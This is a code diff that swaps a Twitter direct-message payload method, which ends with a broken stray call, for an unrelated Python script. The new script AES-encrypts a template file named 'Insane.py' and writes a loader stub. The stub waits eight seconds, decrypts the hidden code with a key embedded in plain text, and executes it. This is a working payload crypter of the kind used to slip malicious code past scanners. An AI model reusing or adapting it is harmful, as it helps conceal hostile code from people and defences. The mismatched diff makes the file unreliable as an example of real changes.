@@ -1,22 +1,50 @@
-def create_trigger_payload(self, message):
-        payload = {
-            'msg': message.text.encode('ascii', 'ignore'),
-            'user': message.sender_screen_name.encode('ascii', 'ignore'),
-            # Cast to string to mitigate long integer bug in product
-            'id': str(message.id),
-            'created_at': message.created_at.encode('ascii', 'ignore'),
-            'sender_id': message.sender_id,
-            'sender_created_at': message.sender.created_at.encode('ascii', 'ignore'),
-            'sender_default_profile': message.sender.default_profile,
-            'sender_default_profile_image': message.sender.default_profile_image,
-            'sender_description': message.sender.description.encode('ascii', 'ignore'),
-            'sender_followers_count': message.sender.followers_count,
-            'sender_friends_count': message.sender.friends_count,
-            'sender_lang': message.sender.lang.encode('ascii', 'ignore'),
-            'sender_location': message.sender.location.encode('ascii', 'ignore'),
-            'sender_name': message.sender.name.encode('ascii', 'ignore'),
-            'recipient_id': message.recipient_id
-        }
-        self.logger.info("Create Trigger Payload: Created {payload}".format(payload=payload))
-        return payload 
-create_trigger_payload()
+from Crypto.Cipher import AES
+from base64 import b64encode
+import string
+import random
+
+
+KEY_LENGTH = 32
+RANDOM_STRING_PAYLOAD = ''.join(random.sample((string.ascii_uppercase + string.digits), KEY_LENGTH))
+PAD = '@'
+
+
+def create_b64_key(bit, chave):
+    """ Create a base64 encoded 32 bit AES key """
+    extra = (KEY_LENGTH - len(bit)) % KEY_LENGTH
+    aes_key = AES.new(chave, AES.MODE_ECB)
+    crypt = aes_key.encrypt(bit + PAD * extra)
+    return b64encode(crypt)  # Return a base64 encoded AES key
+
+
+def create_payload_script(path, output, chave):
+    """ Create the payload script that will be located in Templates/insane_enc.py """
+    vm_template = open(path, 'a+').read()
+    b64_encoded_AES_key = create_b64_key(vm_template, chave)
+    payload = "from Crypto.Cipher import AES\n"  # Create the payload
+    payload += "from base64 import b64decode\n"
+    payload += "from time import sleep\n"
+    payload += "\n\nsleep(8)\n"
+    payload += "aes = AES.new('{}', AES.MODE_ECB)\n".format(chave)
+    payload += "exec(aes.decrypt(b64decode('{}')).rstrip('{}'))".format(b64_encoded_AES_key, PAD)
+    insane_enc_template = open(output, 'a+')
+    try:
+        insane_enc_template.write(payload)
+        insane_enc_template.close()
+    except Exception as e:
+        raise IndexError("Failed to create insane_enc.py with error: {}".format(e))
+
+
+def main():
+    """ Main function that calls all the rest """
+    insanity_template_one = 'Templates/Insane.py'
+    insanity_template_two = 'Templates/insane_enc.py'
+    create_payload_script(
+        insanity_template_one,
+        insanity_template_two,
+        RANDOM_STRING_PAYLOAD
+    )
+
+
+if __name__ == '__main__':
+    main()
